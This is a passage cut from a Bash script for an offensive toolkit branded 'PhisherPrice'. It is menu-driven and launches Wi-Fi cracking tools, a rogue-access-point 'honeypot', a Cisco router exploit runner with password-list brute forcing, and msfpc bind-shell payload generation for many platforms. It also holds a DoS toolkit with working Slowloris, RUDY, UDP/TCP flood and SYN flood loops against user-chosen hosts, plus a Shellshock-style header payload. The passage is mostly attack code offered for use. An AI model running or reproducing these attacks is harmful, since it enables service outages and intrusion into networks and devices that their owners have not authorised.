            found_vulns+=("$name:${green} Vulnerable${reset}")
        else
            found_vulns+=("$name:${red} Not Vulnerable${reset}")
        fi
    done

    # Output vulnerability scan results in a table
    printf "${cyan}Vulnerability Scan Results:${reset}\n\n"
    printf "%-50s %s\n" "${yellow}Vulnerability"           "${yellow} Status${reset}"
    for vuln in "${found_vulns[@]}"; do
        printf "%-40s %s\n" "${vuln%%:*}" "${vuln#*:}"
    done
    printf "\n"
else
    printf "${red}Error:${reset} HTTP ${yellow}$http_code ${reset} returned from URL or IP address.\n"
fi
        ;;
      b|B)
        return
        ;;
        q|Q)
        clear
        echo "${red}Exiting PhisherPrice.${green} Goodbye!${reset}"
        exit 0
        ;;
      *)
        echo "Invalid option: $choice"
        ;;
    esac
    echo ""
    read -p "Press enter to continue..."
  done
}
# Submenu 4 function
submenu4() {
  while true
  do
clear
echo -e "
┌────────────────────────────────────────────┐
│${red}Networking${reset}                                  │
├────────────────────────────────────────────┤
│${green}1${reset}  │ARP Scan                                │
│${green}2${reset}  │Host Info Gathering with netdiscover    │
│${green}3${reset}  │Cisco Routers                           │
│${green}4${reset}  │MasScan (Find Open Ports/Ips)           │
│${green}5${reset}  │Start Wifite                            │
│${green}6${reset}  │Start Yersinia                          │
│${green}7${reset}  │Bully                                   │
│${green}8${reset}  │Start Fern (Wifi Cracker)               │
│${green}9${reset}  │Start Eassid-ng (Buddy-ng)              │
│${green}10${reset} │Start Kismet                            │
│${green}11${reset} │Wi-Fi HoneyPot                          │
│${green}12${reset} │DoS Toolkit                             │
├────────────────────────────────────────────┤
│    b/B To Go To Back ~ q/Q To Exit         │
"├$blue["$red"PhisherPrice$blue]$reset──$blue[$red~$blue]$reset──$blue["$yellow"Networking$blue]:"$reset──────────┘"
read -r -p"└─────► $reset" choice
    case $choice in
      1)
      clear
echo -e "\n${yellow}Network Scanning with arp-scan${reset}"
echo -e "-------------------------------------------\n"

echo "${cyan}Example IP Usage:${yellow} 192.168.9.99${reset}"
echo "Enter the IP address to scan: " 
read subopa && echo "$subopa" >> ~/.bash_history 2>/dev/null

echo -e "\nStarting network scan...\n"

if arp-scan -l -s $subopa -v; then
    echo -e "\nNetwork scan ${green}complete.${reset}\n"
else
    echo -e "\nNetwork scan ${red}failed.${reset}\n"
fi
        ;;
      2)
        clear
echo -e "\n${yellow}Host Information Gathering with netdiscover${reset}"
echo -e "-------------------------------------------\n"

echo -e "${green}Starting${reset} information gathering...\n"

clear
if netdiscover -p; then
  echo -e "\nInformation gathering ${green}complete.${reset}\n"
else
  echo -e "\nInformation gathering ${red}failed.${reset}\n"
fi
        ;;
      3)
        cisco
        ;;
      4)
        clear
echo -e "\n${yellow}Network Port Scanner with Masscan${reset}"
echo -e "---------------------------------\n"
echo "Enter IP (e.g. 192.168.1.0):"
read massip && echo "$massip" >> ~/.bash_history 2>/dev/null
echo "Enter Port Range (e.g. 24 or 80):"
read massrange

clear

echo -e "${green}Starting${reset} port scan...\n"

if masscan -p22,21,80,445,443 $massip/$massrange; then
  echo -e "\nPort scan ${green}complete.${reset}\n"
else
  clear
  echo -e "\nPort scan ${red}failed.${reset}\n"
fi
        ;;
      5)
        clear
echo -e "\n**************************************************"
echo "******     ${cyan}Wifite ${reset}Launcher     ******"
echo -e "**************************************************\n"

read -p "Are you sure you want to start Wifite? (y/n): " wifiwanger

if [[ $wifiwanger =~ ^[Yy]$ ]]; then
  clear
  echo -e "\n**************************************************"
  echo "******     ${green}Starting${reset} Wifite     ******"
  echo -e "**************************************************\n"
  
  wifite --kill-all
else
  clear
  echo -e "\n**************************************************"
  echo "******     ${red}Operation cancelled${reset}     ******"
  echo -e "**************************************************\n"
fi
        ;;
      6)
        clear
echo -e "\n**************************************************"
echo "******     ${cyan}Yersinia${reset} Launcher     ******"
echo -e "**************************************************\n"

read -p "Are you sure you want to start Yersinia? (y/n): " siryessir

if [[ $siryessir =~ ^[Yy]$ ]]; then
  clear
  echo -e "\n**************************************************"
  echo "******     ${green}Starting${reset} Yersinia     ******"
  echo -e "**************************************************\n"

  yersinia -G
else
  clear
  echo -e "\n**************************************************"
  echo "******     ${red}Operation cancelled${reset}     ******"
  echo -e "**************************************************\n"
fi
        ;;
      7)
        clear
echo -e "\n**************************************************"
echo "******     ${cyan}Wi-Fi Bully${reset}     ******"
echo -e "**************************************************\n"

read -p "Enter the ESSID of the network you want to bully (e.g. 6F36E6): " essid
if [[ ! $essid =~ ^[a-fA-F0-9]{6}$ ]]; then
  echo -e "\nInvalid ESSID. Please enter a valid 6-character hexadecimal string."
  read -p "Press Enter to continue."
fi

read -p "Which Wi-Fi interface are you using? (wlan0mon/wlan1mon): " interface
if [[ ! $interface =~ ^(wlan0mon|wlan1mon)$ ]]; then
  echo -e "\nInvalid interface name. Please enter either wlan0mon or wlan1mon."
  read -p "Press Enter to continue."
fi

read -p "Are you sure you want to bully network with ESSID $essid using interface $interface? (y/n): " confirm
if [[ ! $confirm =~ ^[Yy]$ ]]; then
  echo -e "\nOperation ${red}cancelled.${reset}"
  read -p "Press Enter to continue."
fi

clear
echo -e "\n**************************************************"
echo "******     ${green}Starting${reset} Bully     ******"
echo -e "**************************************************\n"
bully -e $essid $interface

if [[ $? -ne 0 ]]; then
  clear
  echo -e "\n${red}Bully failed.${reset} Please make sure you have the necessary tools installed and try again."
  read -p "Press Enter to continue."
fi

echo -e "\n**************************************************"
echo "******     Bullying ${green}complete${reset}     ******"
echo -e "**************************************************\n"

        ;;
      8)
        clear
echo -e "\n**************************************************"
echo "******     ${cyan}Fern Wifi-Cracker${reset} Launcher     ******"
echo -e "**************************************************\n"

read -p "Are you sure you want to start Fern Wifi-Cracker? (y/n): " start_fern

if [[ $start_fern =~ ^[Yy]$ ]]; then
  clear
  echo -e "\n**************************************************"
  echo "******     ${green}Starting ${reset}Fern Wifi-Cracker     ******"
  echo -e "**************************************************\n"

  fern-wifi-cracker
else
  clear
  echo -e "\n**************************************************"
  echo "******     ${red}Operation cancelled${reset}     ******"
  echo -e "**************************************************\n"
fi
        ;;
      9)
        clear
echo -e "\n**************************************************"
echo "******     ${cyan}Easside-NG ${reset}Launcher     ******"
echo -e "**************************************************\n"

read -p "Are you sure you want to start Easside-NG? (y/n): " easside_choice

if [[ $easside_choice =~ ^[Yy]$ ]]; then
  echo "Enter victim's BSSID (e.g. de:ad:be:ef:ca:fe): "
  read vbssid
  
  echo "Enter source MAC address: "
  read srcmac
  
  echo "Enter Buddy-ng IP address (mandatory), usually 127.0.0.1: "
  read srcip
  
  echo "Enter your interface (e.g. wlan0mon or wlan1mon): "
  read easymc
  
  echo "Enter the channel ID (e.g. 6): "
  read easychan
  
  clear
  
  echo -e "\n**************************************************"
  echo "******     ${green}Starting Fern Easside-NG${reset}     ******"
  echo -e "**************************************************\n"
  
  xterm -e "buddy-ng" &
  sleep 1
  
  easside-ng -v $vbssid -m $srcmac -s $srcip -f $easymc -c $easychan
  
else
  
  echo -e "\n**************************************************"
  echo "******     ${red}Operation cancelled${reset}     ******"
  echo -e "**************************************************\n"
fi
        ;;
      10)
        clear
echo -e "\n**************************************************"
echo "******        ${cyan}Kismet ${reset}Launcher        ******"
echo -e "**************************************************\n"

read -p "Are you sure you want to start Kismet? (y/n): " kissmebaby

if [[ $kissmebaby =~ ^[Yy]$ ]]; then
  clear
  echo -e "\n**************************************************"
  echo "******        ${green}Starting${reset} Kismet        ******"
  echo "******  To Stop Kismet CTRL + C     ******"
  echo -e "**************************************************\n"
  
  kismet
else
  clear
  echo -e "\n**************************************************"
  echo "******     ${red}Operation cancelled${reset}     ******"
  echo -e "**************************************************\n"
fi
        ;;
      11)
        clear
echo "Are you sure you want to start HoneyPot?"
read hpot

if [[ $hpot =~ ^[Yy]$ ]]; then
  echo "Enter a wifi name of your choice: " 
  read wifiname
  echo "Enter wifi channel you wish to broadcast on (e.g. 6 or 11): " 
  read wifichannel
  echo "Enter your Interface (e.g. wlan0 or wlan1): " 
  read hpotif

  clear
  echo -e "\n**************************************************"
  echo "******        ${green}Starting${reset} HoneyPot...      ******"
  echo -e "**************************************************\n"

  airmon-ng check kill
  wifi-honey $wifiname $wifichannel $hpotif

  read -p "Press Enter to disable monitor mode and continue." confirm

  if [[ $confirm =~ ^[Yy]$ ]]; then
    sudo service network-manager restart
  else
    echo -e "\n**************************************************"
    echo "******  Monitor mode ${red}has not been disabled.${reset} ******"
    echo -e "**************************************************\n"
  fi

  read -p "Press Enter to continue."
else
  clear
  echo -e "\n**************************************************"
  echo "******        ${red}Operation cancelled${reset}        ******"
  echo -e "**************************************************\n"
fi
        ;;
      12)
        dostoolkit
        ;;
      b|B)
        return
        ;;
        q|Q)
        clear
        echo "${red}Exiting PhisherPrice.${green} Goodbye!${reset}"
        exit 0
        ;;
      *)
        echo "Invalid option: $choice"
        ;;
    esac
    echo ""
    read -p "Press enter to continue..."
  done
}
cisco() {
  while true
  do
clear
	
echo -e "
┌──────────────────────────────────────────────────────────┐
│${red}Cisco Wifi Routers${reset}                                        │
├──────────────────────────────────────────────────────────┤
│${green}1${reset} │Cisco GE xPloit                                        │ 
│${green}2${reset} │Cisco Audit Tool                                       │
├──────────────────────────────────────────────────────────┤ 
│    b/B To Go To Back ~ q/Q To Exit                       │
"├$blue["$red"PhisherPrice$blue]$reset──$blue[$red~$blue]$reset──$blue["$yellow"Networking/Cisco$blue]:"$reset──────────────────┘"
read -r -p"└─────► $reset" choice
    case $choice in
      1)
        clear
echo -e "${yellow}
   __________________           __      _ __ 
  / ____/ ____/ ____/  ______  / /___  (_) /_
 / /   / / __/ __/ | |/_/ __ \/ / __ \/ / __/
/ /___/ /_/ / /____>  </ /_/ / / /_/ / / /_  
\____/\____/_____/_/|_/ .___/_/\____/_/\__/  
                     /_/                     
${reset}"  
function validate_input {
    if ! [[ "$1" =~ ^[1-9][0-9]*$ && "$1" -le 14 ]]; then
        echo "Invalid option selected. Please select a number between 1 and 14."
        exit 1
    fi
}
echo "Enter target IP address:"
read target_ip
cat <<EOF
[1] - Cisco 677/678 Telnet Buffer Overflow Vulnerability
[2] - Cisco IOS Router Denial of Service Vulnerability
[3] - Cisco IOS HTTP Auth Vulnerability
[4] - Cisco IOS HTTP Configuration Arbitrary Administrative Access Vulnerability
[5] - Cisco Catalyst SSH Protocol Mismatch Denial of Service Vulnerability
[6] - Cisco 675 Web Administration Denial of Service Vulnerability
[7] - Cisco Catalyst 3500 XL Remote Arbitrary Command Vulnerability
[8] - Cisco IOS Software HTTP Request Denial of Service Vulnerability
[9] - Cisco 514 UDP Flood Denial of Service Vulnerability
[10] - CiscoSecure ACS for Windows NT Server Denial of Service Vulnerability
[11] - Cisco Catalyst Memory Leak Vulnerability
[12] - Cisco CatOS CiscoView HTTP Server Buffer Overflow Vulnerability
[13] - 0 Encoding IDS Bypass Vulnerability (UTF)
[14] - Cisco IOS HTTP Denial of Service Vulnerability
EOF

echo "Please select a vulnerability to exploit (1-14):"
read vulnerability
validate_input $vulnerability

echo "Do you have a password list? (y/n)"
read -r has_password_list
if [[ $has_password_list == "y" ]]; then
    echo "Please enter the location of your password list:"
    read password_list && echo "$password_list" >> ~/.bash_history 2>/dev/null
    password_option="-a $password_list"
fi

echo "Do you have a user's list for name guessing? (y/n)"
read -r has_user_list
if [[ $has_user_list == "y" ]]; then
    echo "Please enter the location of your user list:"
    read user_list && echo "$user_list" >> ~/.bash_history 2>/dev/null
    user_option="-w $user_list"
fi

echo "Do you want to check for IOS history bug? (y/n)"
read -r has_ios_history_bug
if [[ $has_ios_history_bug == "y" ]]; then
    ios_option="-i"
fi
clear
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!     Trying To PWN Router :D      !!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'
cge.pl "$target_ip" "$vulnerability" "$ios_option" "$password_option" "$user_option"
        ;;
      2)
        clear
check_ios_history() {
    if [ "$ioscheck" == "-i" ]; then
        echo "Checking for IOS history bug..."
    fi
}

guess_usernames() {
    if [ "$userlist" != "" ]; then
        echo "Guessing usernames..."
    fi
}

echo -e "${yellow}
   _________  ______
  / ____/   |/_  __/
 / /   / /| | / /   
/ /___/ ___ |/ /    
\____/_/  |_/_/     
${reset}"  
echo "Cisco Auditing Tool"

echo "Enter the target IP address (e.g. 192.168.1.202): "
read target_ip

echo "Type the port you want to test (default is 23): "
read port_number
if [[ -z "$port_number" ]]; then
    port_number=23
fi

echo "Do you have a password list? (y/n): "
read password_list_option
if [[ "$password_list_option" == "y" ]]; then
    echo "Enter the location of your password list: "
    read password_list_location && echo "$password_list_location" >> ~/.bash_history 2>/dev/null
    if [[ ! -f "$password_list_location" ]]; then
        echo "Password list file not found. Exiting..."
        exit 1
    fi
    password_list="-a $password_list_location"
fi

echo "Do you have a username list for guessing? (y/n): "
read username_list_option
if [[ "$username_list_option" == "y" ]]; then
    echo "Enter the location of your username list: "
    read username_list_location
    if [[ ! -f "$username_list_location" ]]; then
        echo "Username list file not found. Exiting..."
        exit 1
    fi
    userlist="-w $username_list_location"
fi

echo "Do you want to check for IOS history bug? (y/n): "
read ios_history_option
if [[ "$ios_history_option" == "y" ]]; then
    ioscheck="-i"
fi

echo -e "
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!       Auditing the host        !!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
"

CAT -h "$target_ip" -p "$port_number" "$password_list" "$ioscheck" "$userlist"

guess_usernames
check_ios_history
        ;;
      b|B)
        return
        ;;
        q|Q)
        clear
        echo "${red}Exiting PhisherPrice.${green} Goodbye!${reset}"
        exit 0
        ;;
      *)
        echo "Invalid option: $choice"
        ;;
    esac
    echo ""
    read -p "Press enter to continue..."
  done
}
dostoolkit() {
  while true
  do
clear
	
	echo -e "
┌──────────────────────────────────────────────────────────┐
│${red}Denial-Of-Service Toolkit${reset}                                 │
├──────────────────────────────────────────────────────────┤
│${green}1${reset} │Check If Vuln To DoS                                   │
│${green}2${reset} │Slowloris Attack                                       │
│${green}3${reset} │UDP/TCP Flood Attack                                   │
│${green}4${reset} │R-U-Dead-Yet Attack                                    │
│${green}5${reset} │SYN flood attack                                       │
├──────────────────────────────────────────────────────────┤ 
│    b/B To Go To Back ~ q/Q To Exit                       │
"├$blue["$red"PhisherPrice$blue]$reset──$blue[$red~$blue]$reset──$blue["$yellow"DoS-Toolkit$blue]:"$reset───────────────────────┘"
read -r -p"└─────► $reset" choice
    case $choice in
      1)
        clear
# Prompt user for hostname or IP address
    echo "Enter a ${yellow}hostname${reset} or ${yellow}IP address${reset} to check for vulnerabilities:"
    read -e target && echo "$target" >> ~/.bash_history 2>/dev/null
    echo ""

# Read user agents from file
    user_agents=$(cat main/user_agents.txt)

# Check for Slowloris attack
    echo "Checking for Slowloris ${yellow}attack...${reset}"
  if curl -A "$user_agents" --connect-timeout 10 -m 60 -k -s -o /dev/null -w "%{http_code}" -H "Connection: close" -H "Accept-language: en-US,en,q=0.5" "${target}" | grep -q "4[0-9][0-9]\|5[0-9][0-9]"; then
    echo "Slowloris attack ${green}detected!${reset}"
  else
    echo "Slowloris attack ${red}not detected.${reset}"
fi

# Check for UDP/TCP Flood attack
    echo "Checking for UDP/TCP Flood ${yellow}attack...${reset}"
  if hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood "${target}" 2>&1 | grep -q "10000 packets transmitted, [0-9]* packets received, -100% packet loss"; then
    echo "UDP/TCP Flood attack ${green}detected!${reset}"
  else
    echo "UDP/TCP Flood attack ${red}not detected.${reset}"
fi

# Check for R-U-Dead-Yet attack
    echo "Checking for R-U-Dead-Yet ${yellow}attack...${reset}"
  if curl -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US,en;q=0.5" -H "User-Agent: () { :; }; /bin/bash -c 'echo Vulnerable!'" -H "Connection: keep-alive" --connect-timeout 10 -m 60 -k -s -o /dev/null -w "%{http_code}" "${target}" | grep -q "5[0-9][0-9]"; then
    echo "R-U-Dead-Yet attack ${green}detected!${reset}"
  else
    echo "R-U-Dead-Yet attack ${red}not detected.${reset}"
fi

    # Check for SYN Flood attack
    echo "Checking for SYN Flood ${yellow}attack...${reset}"
  if hping3 -c 10000 -d 120 -S -w 64 --flood "${target}" 2>&1 | grep -q "10000 packets transmitted, [0-9]* packets received, -100% packet loss"; then
    echo "SYN Flood attack ${green}detected!${reset}"
  else
    echo "SYN Flood attack ${red}not detected.${reset}"
fi
        ;;
      2)
            clear
    echo "Slowloris Type Attack"
    read -e -p "Enter the hostname or IP address of the target: " host && echo "$host" >> ~/.bash_history 2>/dev/null
    read -e -p "Enter the port number of the target: " port
    read -e -p "Enter the number of requests to send: " requests
    read -e -p "Enter the time to last (in seconds): " duration
    read -e -p "Enter the delay between requests (in seconds): " delay
    read -e -p "Use HTTPS? [y/n]: " use_https

    if [[ $use_https == "y" ]]; then
      protocol="https"
    else
      protocol="http"
    fi

    read -p "Randomize User-Agent header? [y/n]: " randomize_ua

    if [[ $randomize_ua == "y" ]]; then
      ua_flag="-H 'User-Agent: \$(shuf -n 1 main/user_agents.txt)'"
    else
      ua_flag=""
    fi

    endtime=$((SECONDS+duration))

    echo "Starting Slowloris attack on $host:$port for $duration seconds with $requests requests and $delay second delay between requests."

    while [ $SECONDS -lt $endtime ]; do
      for ((i=0;i<$requests;i++)); do
        if [[ $randomize_ua == "y" ]]; then
          eval "curl -s -o /dev/null -k -m 10 --retry 0 $ua_flag ${protocol}://$host:$port/ >/dev/null 2>&1 &"
        else
          curl -s -o /dev/null -k -m 10 --retry 0 ${protocol}://$host:$port/ >/dev/null 2>&1 &
        fi
        sleep $delay
      done
      echo -ne "Slowloris attack in progress...\r"
      sleep 0.5
      echo -ne "                                                   \r"
      sleep 0.5
    done

    echo "Slowloris ${red}attack${reset} on ${cyan}$host:${yellow}$port ${reset}finished."
        ;;
      3)
        clear
      echo "UDP/TCP Flood Attack with Multithreading and Randomization"
      echo "Example: 10.0.0.1 80 1024 60 50"
      read -p "IP" ip && echo "$ip" >> ~/.bash_history 2>/dev/null

      read -e -p "Port" port

      read -e -p "Size of the packet to send" size

      read -e -p "Time in seconds" t

      read -e -p "Number of threads to use" threads

      read -e -p "Do you want to randomize packet content? (y/n)" randomize_content

      read -e -p "Do you want to randomize delay between requests? (y/n)" randomize_delay

      read -e -p "Which protocol do you want to use? (UDP/TCP)" protocol

  endtime=$((SECONDS+t))

echo "~To cancel the attack press 'Ctrl-C'"
echo "|${cyan}IP${reset}|            |${cyan}Port${reset}|            |${cyan}Size${reset}|            |${cyan}Time${reset}|            |${cyan}Threads${reset}|            |${cyan}Randomize Content${reset}|            |${cyan}Randomize Delay${reset}|            |${cyan}Protocol${reset}|"
echo "|$ip|            |$port|            |$size|            |$t|            |$threads|            |$randomize_content|            |$randomize_delay|            |$protocol|"

function attack {
  if [ "$randomize_content" == "y" ]; then
    data=$(head -c $size /dev/urandom | tr -dc 'a-zA-Z0-9')
  else
    data=$(printf "%${size}s" | tr ' ' 'A')
  fi

  if [ "$protocol" == "UDP" ]; then
    echo "$data" > /dev/udp/$ip/$port
  else
    echo "$data" | nc -w 1 $ip $port
  fi
}

for ((i=0;i<$threads;i++)); do
  while [ $SECONDS -lt $endtime ]; do
    attack &
    if [ "$randomize_delay" == "y" ]; then
      sleep 0.$((RANDOM%3))
    else
      sleep 0.1
    fi
  done
done

echo "${green}Attack finished.${reset}"
        ;;
      4)
        clear
      echo "R-U-Dead-Yet (RUDY) Type Attack"
      echo "Example: example.com 80 1000 60"
      echo "Host"
      read -e host && echo "$host" >> ~/.bash_history 2>/dev/null

      echo "Port"
      read -e port

      echo "Size of the payload in bytes"
      read -e payload_size

      echo "Number of headers"
      read -e header_count

      echo "Number of packets to send"
      read -e packet_count

      echo "Duration in seconds"
      read -e duration

endtime=$((SECONDS+duration))

echo "~To cancel the attack press 'Ctrl-C'"
echo "|${cyan}Hostname${reset}|            |${cyan}Port${reset}|            |${cyan}Payload Size${reset}|            |${cyan}Header Count${reset}|            |${cyan}Packet Count${reset}|            |${cyan}Duration${reset}|"
echo "|$host|            |$port|            |$payload_size|            |$header_count|            |$packet_count|            |$duration|"

while [ $SECONDS -lt $endtime ]; do
  headers=""
  for ((j=1; j<=header_count; j++)); do
    header_name=$(head /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
    header_value=$(head /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1)
    headers+="\r\n$header_name: $header_value"
  done
  payload=$(head /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $payload_size | head -n 1)
  user_agent=$(shuf -n 1 main/user_agents.txt)
  curl -A "$user_agent" -H "$headers" -d "$payload" -X POST "http://$host:$port" >/dev/null 2>&1
  echo "Sent request at $(date)"
done

echo "${green}Attack finished.${reset}"
        ;;
      5)
        clear
      echo "SYN flood attack"
      echo "Example: example.com 80"
      echo "Host"
      read -e host && echo "$host" >> ~/.bash_history 2>/dev/null

      echo "Port"
      read -e port

      echo "Number of packets to send"
      read -e packets

      echo "Packet size in bytes"
      read -e size

      echo "Window size"
      read -e window_size

      echo "Sending ${yellow}$packets${reset} packets of size ${yellow}$size${reset} bytes with window size ${yellow}$window_size${reset} to ${green}$host${reset} on port ${green}$port${reset}"

data=$(head -c $size /dev/urandom | tr -dc 'a-zA-Z0-9')
for ((i=1;i<=$packets;i++)); do
  hping3 -c 1 -d $size -S -w $window_size $host -p $port >/dev/null 2>&1
  sleep 0.1
  echo "$data" >/dev/udp/$host/$port >/dev/null 2>&1
  sleep 0.1

  hping3 -c 1 -d $size -F -w $window_size $host -p $port >/dev/null 2>&1
done

echo "${green}Attack finished.${reset}"
        ;;
      b|B)
        return
        ;;
        q|Q)
        clear
        echo "${red}Exiting PhisherPrice.${green} Goodbye!${reset}"
        exit 0
        ;;
      *)
        echo "Invalid option: $choice"
        ;;
    esac
    echo ""
    read -p "Press enter to continue..."
  done
}
# Submenu 5 function
submenu5() {
  while true
  do
clear
	
	echo -e "
┌────────────────────────────────────────────┐
│${red}Create Your Own Xsploit${reset}                     │
├────────────────────────────────────────────┤
│${green}1${reset}  │Windows                                 │
│${green}2${reset}  │Linux                                   │
│${green}3${reset}  │OSX                                     │
│${green}4${reset}  │APK                                     │
│${green}5${reset}  │ASP                                     │
│${green}6${reset}  │ASPX                                    │
│${green}7${reset}  │Bash                                    │
│${green}8${reset}  │Java                                    │
│${green}9${reset}  │Perl                                    │
│${green}10${reset} │PHP                                     │
│${green}11${reset} │Powershell                              │
│${green}12${reset} │Python                                  │
│${green}13${reset} │Tomcat                                  │
├────────────────────────────────────────────┤
│    b/B To Go To Back ~ q/Q To Exit         │
"├$blue["$red"PhisherPrice$blue]$reset──$blue[$red~$blue]$reset──$blue["$yellow"CYO Xsploit$blue]:"$reset─────────┘"
read -r -p"└─────► $reset" choice
    case $choice in
      1)
clear

msfpc windows bind 5555 verbose
        ;;
      2)
clear
msfpc linux bind 5555 verbose
        ;;
      3)
clear

msfpc osx bind 5555 verbose
        ;;
      4)
clear

msfpc apk bind 5555 verbose
        ;;
      5)
clear

msfpc asp bind 5555 verbose
        ;;
      6)
clear

msfpc aspx bind 5555 verbose
        ;;
      7)
clear

msfpc bash bind 5555 verbose
        ;;
      8)
clear

msfpc java bind 5555 verbose
        ;;
      9)
clear

msfpc perl bind 5555 verbose
        ;;
      10)
clear

msfpc php bind 5555 verbose
        ;;
      11)
clear

msfpc powershell bind 5555 verbose
        ;;
      12)
clear

msfpc python bind 5555 verbose
        ;;
      13)
clear
msfpc tomcat bind 5555 verbose
        ;;
      b|B)
        return
        ;;
        q|Q)
        clear
        echo "${red}Exiting PhisherPrice.${green} Goodbye!${reset}"
        exit 0
        ;;
      *)
        echo "Invalid option: $choice"
        ;;
    esac
    echo ""
    read -p "Press enter to continue..."
  done
}
# Submenu 6 function
submenu6() {
  while true
  do
clear
echo -e "
┌────────────────────────────────────────────────────────────────────┐
│${red}AutoExif${reset}                                                            │
├────────────────────────────────────────────────────────────────────┤            
│${green}1${reset}   │Read Image MetaData (Basic)                                    │
│${green}2${reset}   │Read Image MetaData (Expert)                                   │
│${green}3${reset}   │Read Imge MetaData (From Website)                              │
│${green}4${reset}   │Wipe Data From Image (Except JFIF Groups)                      │
│${green}5${reset}   │Wipe All GPS Data From Image                                   │
│${green}6${reset}   │Wipe All MetaData From Image (Adds Comment Back In)            │
│${green}7${reset}   │Extract GPS from AVCH video                                    │
│${green}9${reset}   │Extract Info From Thumbnail                                    │
│${green}10${reset}  │Wipe Photoshop MetaData                                        │
│${green}h/H${reset} │Help                                                           │
├────────────────────────────────────────────────────────────────────┤ 
│    b/B To Go To Back ~ q/Q To Exit                                 │
"├$blue["$red"PhisherPrice$blue]$reset──$blue[$red~$blue]$reset──$blue["$yellow"AutoExif$blue]:"$reset────────────────────────────────────┘"
read -r -p"└─────► $reset" choice
    case $choice in
      1)
      clear
echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
read -e meta1 && echo "$meta1" >> ~/.bash_history 2>/dev/null
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!        Extracting Data        !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

exiftool $meta1

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!! Data Extracted using AutoExif !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
        ;;
      2)
      clear
echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
read -e mdeep&& echo "$mdeep" >> ~/.bash_history 2>/dev/null
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!        Extracting Data        !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

cat $mdeep | exiftool -

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!! Data Extracted using AutoExif !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
        ;;
      3)
      clear
echo "enter image location for eg: http://a.domain.com/bigfile.jpg"
read -e exifop1host && echo "$exifop1host" >> ~/.bash_history 2>/dev/null
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!        Extracting Data        !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

curl -s $exifop1host | exiftool -fast -

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!! Data Extracted using AutoExif !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
        ;;
      4)
      clear
echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
read -e exifop4 && echo "$exifop4" >> ~/.bash_history 2>/dev/null
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!       Wiping JFIF Data        !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

exiftool -all= --jfif:all $exifop4

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!   Data Wiped Using AutoExif   !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
        ;;
      5)
      clear
echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
read -e exifop5 && echo "$exifop5" >> ~/.bash_history 2>/dev/null
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!        Wiping GPS Data        !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'

exiftool -gps:all= $exifop5

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!   Data Wiped Using AutoExif   !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
        ;;
      6)
      clear
echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
read -e exifop6 && echo "$exifop6" >> ~/.bash_history 2>/dev/null
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!        Replacing Data         !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

exiftool -all= -comment='Protected By NULLSecurity Team' $exifop6

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!! Data Replaced Using AutoExif !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
        ;;
      7)
      clear
echo "enter image name followed by its file type eg: /home/username/Videos/lulz.m2ts"
read -e avch && echo "$avch" >> ~/.bash_history 2>/dev/null
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!        EXTRACTING PLEASE WAIT        !
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

exiftool -ee -p '$gpslatitude, $gpslongitude, $gpstimestamp' $avch

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!! Data Extracted using AutoExif !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
        ;;
      8)
      clear
echo "enter image name followed by its file type eg: /home/username/pictures/lulz.png"
read -e exif8 && echo "$exif8" >> ~/.bash_history 2>/dev/null
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
